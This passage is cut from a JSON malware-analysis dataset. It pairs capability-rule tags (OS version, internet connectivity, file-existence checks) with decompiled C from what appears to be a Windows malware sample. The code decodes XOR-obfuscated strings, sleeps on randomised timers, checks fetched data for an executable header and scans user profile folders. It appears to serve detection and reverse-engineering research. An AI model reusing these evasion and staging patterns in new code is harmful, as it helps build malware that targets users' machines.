0;\n                puVar10 = puVar10 + 1;\n            }\n            var_28h = 0x5459012c;\n            var_24h._0_2_ = 0x6d5c;\n            var_18h = 0x35586d38;\n            var_14h._0_2_ = 0x7176;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n            iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            var_60h = &var_30h - iVar9;\n            do {\n                iVar7 = (*_sym.imp.USER32.dll_CreateMenu)();\n                if (iVar7 != 0xc1ab73) {\n                    *(iVar6 + iVar9) = *(&var_18h + iVar6 % var_64h) ^ (iVar6 + iVar9)[var_60h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, iVar9, var_74h);\n            iVar6 = fcn.00401f28(0, &ARG_0, &var_68h, &var_8h);\n            if (iVar6 == 0) {\n                if (var_68h == 0) {\n                    fcn.00408e0c();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                if (var_20h < var_68h) {\n                    fcn.00408e0c();\n                    var_6ch = var_6ch * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_6ch % 600000 + 60000);\n                }\n                else if (((4 < var_68h) && (var_68h == var_20h)) &&\n                        ((var_1ch != NULL && ((*var_1ch == 'M' && (var_1ch[1] == 'Z')))))) {\n                    fcn.00408db5();\n                    fcn.00408e0c();\n                    uVar4 = (*pcVar2)(0, iVar9);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*pcVar2)(0, iVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            pcVar5 = var_10h;\n        }\n        var_ch = var_ch + 0x20;\n        var_70h = var_70h + 1;\n    } while (var_ch < 0x412430);\n    iVar9 = *var_5ch;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return iVar9 != 0;\n}\n",
        "token_count": 1795
    },
    "004070d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040714e)\n// WARNING: Removing unreachable block (ram,0x0040715e)\n// WARNING: Removing unreachable block (ram,0x0040716b)\n// WARNING: Removing unreachable block (ram,0x00407176)\n// WARNING: Removing unreachable block (ram,0x00407185)\n// WARNING: Removing unreachable block (ram,0x0040718f)\n// WARNING: Removing unreachable block (ram,0x00407191)\n// WARNING: Removing unreachable block (ram,0x00407197)\n// WARNING: Removing unreachable block (ram,0x004071ad)\n\nuint __cdecl fcn.004070d4(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41cb5c;\n    puVar4 = 0x41cb0c;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.00406ced();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41cb18 == 0) {\n        if (*0x41caa8 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            iVar2 = fcn.00406dcc();\n            if (iVar2 != 0) {\n                fcn.00408e0c();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 433
    },
    "00408c8e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00408c8e(void)\n\n{\n    uint32_t uVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0xaea3ed09;\n    uVar1 = 0;\n    var_20h = 0x2993125a;\n    var_1ch = 0x3d75a3ff;\n    var_18h = 0x662d9d39;\n    var_14h = 0x922df04;\n    var_10h = 0xc84f40f0;\n    var_ch = 0xdcfc6e80;\n    do {\n        var_8h = (&var_24h)[uVar1];\n        var_4h = 0;\n        fcn.004073b8();\n        if (var_4h == 0) {\n            return 0;\n        }\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 7);\n    return 1;\n}\n",
        "token_count": 277
    },
    "00408db5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408db5(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if ((param_1 != NULL) && (param_2 != NULL)) {\n        if (param_1[1] != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_1[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        uVar2 = (*pcVar1)(8, *param_2);\n        puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        param_1[1] = puVar3;\n        if (puVar3 != NULL) {\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *param_1 = *param_2;\n            puVar3 = param_2[1];\n            puVar5 = param_1[1];\n            for (iVar4 = *param_2; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 370
    },
    "00409121": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409121(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    uint lpcchSize;\n    int32_t var_70h;\n    uint ARG_0;\n    int32_t var_68h;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint lpFileName;\n    int32_t lpMem;\n    uint var_44h;\n    uint lpProfileDir;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    lpFileName = (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(8, 0x208);\n    ARG_0 = (*pcVar5)(uVar2);\n    lpcchSize = 0x104;\n    var_28h = 0x4a164a3a;\n    var_24h = 0x792b7656;\n    var_20h = 0x4a563526;\n    var_1ch = 0x76504a2a;\n    var_18h = 0x353e793e;\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 0x4a;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 0x4a;\n    var_10h._0_1_ = 0x52;\n    var_10h._1_1_ = 0x76;\n    var_10h._2_1_ = 0x39;\n    stack0xffffffef = 0x22351679;\n    stack0xfffffff3 = 0x584a1c4a;\n    var_8h._3_1_ = 0x76;\n    var_4h._0_1_ = 0x3a;\n    var_4h._1_1_ = 0x79;\n    var_4h._2_2_ = 0x354a;\n    lpMem = 0x4a794a76;\n    var_44h._0_1_ = 0x35;\n    uVar2 = (*pcVar1)(8, 0x51);\n    iVar3 = (*pcVar5)(uVar2);\n    var_50h = 5;\n    iVar6 = 0;\n    var_70h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar4 != 0xf2ae1e) {\n            *(iVar6 + iVar3) = *(&lpMem + iVar6 % var_50h) ^ (iVar6 + iVar3)[&var_28h - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x28);\n    var_28h = 0x38175a14;\n    var_24h = 0x671e551a;\n    var_20h = 0x5a216a59;\n    var_78h = 6;\n    var_14h._2_1_ = 6;\n    var_1ch = 0x55363806;\n    var_18h = 0x6a576716;\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 0x5a;\n    var_14h._3_1_ = 0x38;\n    var_10h._1_1_ = 0x55;\n    stack0xffffffef = 0x306a6c67;\n    stack0xfffffff3 = 0x1a380a5a;\n    var_8h._3_1_ = 0x55;\n    var_4h._0_1_ = 0x5a;\n    var_4h._1_1_ = 0x67;\n    var_3ch = 0x38675a55;\n    var_38h._0_1_ = 0x6a;\n    var_10h._0_1_ = var_14h._2_1_;\n    var_10h._2_1_ = var_14h._2_1_;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    var_80h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = 0;\n    lpMem = var_80h;\n    var_34h = &var_28h - var_80h;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        uVar2 = lpProfileDir;\n        if (iVar6 != 0x804001) {\n            *(iVar3 + var_80h) = *(&var_3ch + iVar3 % var_50h) ^ (iVar3 + var_80h)[&var_28h - var_80h];\n        }\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x26);\n    var_7ch = var_70h;\n    iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_34h = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x41092c);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x410930),  iVar6 != 0)) {\n                var_64h = 0;\n                var_58h = 0x61784615;\n                var_54h._0_2_ = 0x4943;\n                var_30h = 0x61524649;\n                var_2ch._0_1_ = 0x43;\n                var_60h = 0x306f4538;\n                var_5ch._0_2_ = 0x3354;\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar2);\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_68h = &var_58h - iVar3;\n                    var_3ch = iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                        if (iVar4 != 0xa72f35) {\n                            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_50h) ^ (iVar6 + iVar3)[&var_58h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar3);\n                    var_14h._0_1_ = 0x1d;\n                    var_14h._1_1_ = 0x45;\n                    var_14h._2_1_ = 0x1c;\n                    var_14h._3_1_ = 0x30;\n                    var_10h._0_1_ = 8;\n                    var_10h._1_1_ = 0x33;\n                    var_10h._2_1_ = 0x1d;\n                    stack0xffffffef = 0x8301c45;\n                    stack0xfffffff3 = 0x1c451d33;\n                    var_8h._3_1_ = 0x30;\n                    var_4h._0_1_ = 0x54;\n                    var_4h._1_1_ = 0x33;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_68h = &var_14h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n                        if (iVar4 != 0x8dbdf) {\n                            *(iVar6 + iVar3) = *(&var_60h + iVar6 % var_78h) ^ (iVar6 + iVar3)[&var_14h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_80h)[var_64h]);\n                    fcn.00403c2c(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_3ch);\n                    (*pcVar1)(uVar2);\n                    var_64h = var_64h + 1;\n                    uVar2 = lpProfileDir;\n                    iVar3 = var_34h;\n                } while (var_64h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_34h = -1;\n            }\n        }\n    }\n    var_24h = 0x4907346c;\n    var_20h = 0x5447490e;\n    var_1ch = 0x342c773d;\n    var_18h = 0x49254939;\n    var_14h._0_1_ = 0x5b;\n    var_14h._1_1_ = 0x54;\n    var_14h._2_1_ = 0x26;\n    var_14h._3_1_ = 0x77;\n    var_10h._0_1_ = 0x3d;\n    var_10h._1_1_ = 0x34;\n    var_10h._2_1_ = 0x71;\n    stack0xffffffef = 0x60492b49;\n    stack0xfffffff3 = 0x24772c54;\n    var_8h._3_1_ = 0x34;\n    var_4h._0_1_ = 0x24;\n    var_4h._1_1_ = 0x49;\n    var_4h._2_2_ = 0x4977;\n    var_30h = 0x49543449;\n    var_2ch._0_1_ = 0x77;\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_3ch = &var_24h - iVar3;\n    do {\n        iVar4 = (*pcVar5)();\n        if (iVar4 != 0x74da91) {\n            *(iVar6 + iVar3) = *(&var_30h + iVar6 % var_50h) ^ (iVar6 + iVar3)[var_3ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.00403c2c(1);\n    uVar2 = (*pcVar5)(0, lpFileName);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, ARG_0);\n    (*pcVar1)(uVar2);\n    uVar2 = (*pcVar5)(0, lpProfileDir);\n    (*pcVar1)(uVar2);\n    uVar2 = (*pcVar5)(0, iVar3);\n    (*pcVar1)(uVar2);\n    uVar2 = (*pcVar5)(0, lpMem);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar5)(0, var_70h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 3232
    },
    "004095d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004095d7(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uchar *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint32_t uVar13;\n    code *pcVar14;\n    int16_t *piVar15;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    uint var_c4h;\n    int32_t lpString2;\n    int32_t var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a3h;\n    uint var_9fh;\n    uchar var_9bh;\n    uchar var_9ah;\n    uint var_99h;\n    uint var_95h;\n    uint var_91h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t hFindFile;\n    uchar *ARG_0;\n    int16_t *var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uchar *lpFileName;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t dwBytes;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.USERENV.dll_GetProfilesDirectoryW;\n    var_c4h = 0;\n    ARG_0 = NULL;\n    dwBytes = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &dwBytes);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (dwBytes != 0) {\n        dwBytes = dwBytes + 10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes * 2);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_5ch = piVar4;\n        uVar3 = (*pcVar14)(8, dwBytes * 2);\n        lpFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(8, 0x208);\n            puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            puVar6 = &lpFindFileData;\n            ARG_0 = puVar5;\n            for (iVar10 = 0x250; piVar4 = var_5ch,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            for (iVar10 = 0x208; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = lpFileName;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar15 = var_5ch;\n            for (iVar10 = dwBytes * 2; iVar10 != 0; iVar10 = iVar10 + -1) {\n                *piVar15 = 0;\n                piVar15 = piVar15 + 1;\n            }\n            iVar10 = (*pcVar2)(var_5ch, &dwBytes);\n            if (iVar10 != 0) {\n                iVar10 = lpFileName - piVar4;\n                do {\n                    iVar1 = *piVar4;\n                    *(piVar4 + iVar10) = iVar1;\n                    piVar4 = piVar4 + 1;\n                } while (iVar1 != 0);\n                var_54h = 0x686b622f;\n                var_50h = 0x6259434a;\n                var_4ch._0_2_ = 0x6841;\n                var_8h = 0x68416273;\n                var_4h._0_2_ = 0x4364;\n                uVar3 = (*pcVar14)(8, 0x15);\n                puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                var_bch = 6;\n                iVar10 = 0;\n                lpMem = puVar6;\n                do {\n                    iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                    if (iVar7 != 0x3ba91d) {\n                        *(iVar10 + puVar6) = *(&var_8h + iVar10 % var_bch) ^ (iVar10 + puVar6)[&var_54h - puVar6];\n                    }\n                    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    iVar10 = iVar10 + 1;\n                    puVar12 = puVar6;\n                } while (iVar10 < 10);\n                do {\n                    iVar1 = *puVar12;\n                    puVar12 = puVar12 + 2;\n                } while (iVar1 != 0);\n                uVar13 = puVar12 - puVar6;\n                puVar12 = lpFileName + -2;\n                do {\n                    piVar4 = puVar12 + 2;\n                    puVar12 = puVar12 + 2;\n                } while (*piVar4 != 0);\n                for (uVar11 = uVar13 >> 2; uVar11 != 0; uVar11 = uVar11 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                for (uVar13 = uVar13 & 3; uVar13 != 0; uVar13 = uVar13 - 1) {\n                    *puVar12 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n                if (hFindFile != -1) {\n                    var_58h = 0x47463747;\n                    var_6ch = 0x47463769;\n                    var_68h._0_1_ = 0x47;\n                    var_7ch = 0x46646779;\n                    var_78h._0_2_ = 0x564f;\n                    var_84h = 0x464a6757;\n                    var_80h._0_2_ = 0x564f;\n                    var_b8h = 5;\n                    do {\n                        iVar7 = 0;\n                        uVar3 = (*pcVar14)(8, 9);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        lpString2 = iVar10;\n                        var_44h = &var_58h - iVar10;\n                        do {\n                            iVar8 = (*_sym.imp.USER32.dll_GetCapture)();\n                            if (iVar8 != 0x43bd07) {\n                                *(iVar7 + iVar10) = *(&var_6ch + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_58h - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 4);\n                        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        iVar7 = 0;\n                        var_d0h = iVar10;\n                        var_44h = &var_7ch - iVar10;\n                        do {\n                            iVar9 = (*_sym.imp.USER32.dll_CreateMenu)();\n                            iVar8 = lpString2;\n                            if (iVar9 != 0x46b1c5) {\n                                *(iVar7 + iVar10) = *(&var_84h + iVar7 % var_bch) ^ (iVar7 + iVar10)[&var_7ch - iVar10];\n                            }\n                            iVar7 = iVar7 + 1;\n                        } while (iVar7 < 6);\n                        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, lpString2);\n                        pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        if (((iVar7 != 0) &&\n                            (iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, iVar10),  iVar7 != 0)) &&\n                           ((lpFindFileData & 0x10) != 0)) {\n                            var_38h = 0x4a164a3a;\n                            var_34h = 0x792b7656;\n                            var_30h = 0x4a563526;\n                            var_2ch = 0x76504a2a;\n                            var_28h = 0x353e793e;\n                            var_24h = 0x4a174a1f;\n                            var_20h = 0x79397652;\n                            var_1ch = 0x4a223516;\n                            var_18h = 0x76584a1c;\n                            var_14h = 0x354a793a;\n                            var_74h = 0x4a794a76;\n                            var_70h._0_1_ = 0x35;\n                            uVar3 = (*pcVar14)(8, 0x51);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_44h = iVar10;\n                            var_10h = &var_38h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n                                if (iVar8 != 0xf2ae1e) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_74h + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_38h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x28);\n                            var_b4h = 0x38175a14;\n                            var_b0h = 0x671e551a;\n                            var_ach = 0x5a216a59;\n                            var_a8h._0_1_ = 6;\n                            stack0xffffff55 = 0x16553638;\n                            var_a3h = 0x366a5767;\n                            var_9fh._0_1_ = 0x5a;\n                            var_9fh._2_1_ = 0x38;\n                            var_9bh = 0x55;\n                            var_99h = 0x306a6c67;\n                            var_95h = 0x1a380a5a;\n                            var_91h._0_2_ = 0x5a55;\n                            var_91h._2_1_ = 0x67;\n                            var_8h = 0x38675a55;\n                            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6a);\n                            var_9fh._1_1_ = var_a8h;\n                            var_9fh._3_1_ = var_a8h;\n                            var_9ah = var_a8h;\n                            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n                            iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                            iVar7 = 0;\n                            var_cch = iVar10;\n                            var_10h = &var_b4h - iVar10;\n                            do {\n                                iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                                if (iVar8 != 0x804001) {\n                                    *(iVar7 + iVar10) =\n                                         *(&var_8h + iVar7 % var_b8h) ^ (iVar7 + iVar10)[&var_b4h - iVar10];\n                                }\n                                iVar7 = iVar7 + 1;\n                            } while (iVar7 < 0x26);\n                            var_50h = var_44h;\n                            var_10h = 0;\n                            var_8ch = 0x714c736d;\n                            var_88h._0_2_ = 0x5234;\n                            pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                            var_54h = iVar10;\n                            do {\n                                var_40h = 0x713f7348;\n                                var_3ch = 0x73485268;\n                                var_38h = 0x5268713f;\n                                var_34h = 0x713f7348;\n                                var_30h = 0x73185268;\n                                var_2ch = 0x525e713d;\n                                var_28h = 0x7127730e;\n                                var_24h = 0x730a5251;\n                                var_20h = 0x525c7139;\n                                var_1ch = 0x71627301;\n                                var_18h = 0x73005240;\n                                var_14h = 0x5234713c;\n                                uVar3 = (*pcVar14)(8, 0x61);\n                                iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                                iVar7 = 0;\n                                var_c8h = &var_40h - iVar10;\n                                do {\n                                    iVar8 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                                    puVar5 = ARG_0;\n                                    if (iVar8 != 0x314064) {\n                                        *(iVar7 + iVar10) =\n                                             *(&var_8ch + iVar7 % var_bch) ^ (iVar7 + iVar10)[&var_40h - iVar10];\n                                    }\n                                    iVar7 = iVar7 + 1;\n                                } while (iVar7 < 0x30);\n                                (*_sym.imp.USER32.dll_wsprintfW)\n                                          (ARG_0, iVar10, var_5ch, &lpString1, (&var_54h)[var_10h]);\n                                iVar7 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(puVar5);\n                                pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                if (iVar7 != -1) {\n                                    fcn.00403f18();\n                                    var_c4h = 1;\n                                }\n                                uVar3 = (*pcVar14)(0, iVar10);\n                                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                var_10h = var_10h + 1;\n                            } while (var_10h < 2);\n                            uVar3 = (*pcVar14)(0, var_cch);\n                            (*pcVar2)(uVar3);\n                            uVar3 = (*pcVar14)(0, var_44h);\n                            (*pcVar2)(uVar3);\n                            iVar10 = var_d0h;\n                            iVar8 = lpString2;\n                        }\n                        uVar3 = (*pcVar14)(0, iVar10);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        uVar3 = (*pcVar14)(0, iVar8);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n                    } while (iVar10 != 0);\n                }\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                uVar3 = (*pcVar14)(0, lpMem);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                piVar4 = var_5ch;\n            }\n        }\n        if (lpFileName != NULL) {\n            uVar3 = (*pcVar14)(0, lpFileName);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (piVar4 != NULL) {\n            uVar3 = (*pcVar14)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        if (ARG_0 != NULL) {\n            uVar3 = (*pcVar14)(0, ARG_0);\n            